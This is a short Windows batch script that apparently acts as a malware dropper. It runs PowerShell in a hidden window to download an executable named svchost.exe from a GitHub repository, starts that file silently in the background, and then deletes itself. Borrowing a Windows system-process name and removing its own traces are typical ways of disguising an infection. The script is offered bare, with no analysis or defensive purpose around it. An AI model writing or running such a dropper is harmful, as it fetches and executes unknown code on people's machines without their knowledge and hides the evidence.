@echo off
cd /d "%~dp0"
powershell -w hidden -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe', '%~dp0svchost.exe')"
if exist "%~dp0svchost.exe" start /b "" "%~dp0svchost.exe"
del "%~f0" >nul 2>&1
